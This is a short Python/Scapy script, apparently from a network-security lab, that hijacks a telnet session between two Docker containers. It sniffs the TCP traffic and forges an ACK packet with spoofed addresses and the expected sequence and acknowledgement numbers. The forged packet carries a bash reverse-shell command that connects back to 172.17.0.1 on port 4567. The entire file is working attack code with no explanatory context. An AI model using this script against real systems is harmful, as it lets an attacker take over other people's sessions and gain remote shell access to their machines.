#!/usr/bin/python3
from scapy.all import *

SRC  = "172.17.0.2"
DST  = "172.17.0.3"
PORT = 23

def spoof(pkt):
    old_ip  = pkt[IP]
    old_tcp = pkt[TCP]
    #############################################
    ip  =  IP( src   = old_ip.dst,
               dst   = old_ip.src
             )
    tcp = TCP( sport = old_tcp.dport,
               dport = old_tcp.sport,
               seq   = pkt.ack,
               ack   = pkt.seq + len(pkt.load),
               flags = "A"
             )
    data = "\n/bin/bash -i > /dev/tcp/172.17.0.1/4567 0<&1 2>&1\n"
    #############################################

    pkt = ip/tcp/data
    send(pkt,verbose=0)
    ls(pkt)
    quit()

f = 'tcp and src host {} and dst host {} and src port {}'.format(SRC, DST, PORT)
sniff(iface="docker0",filter=f, prn=spoof)


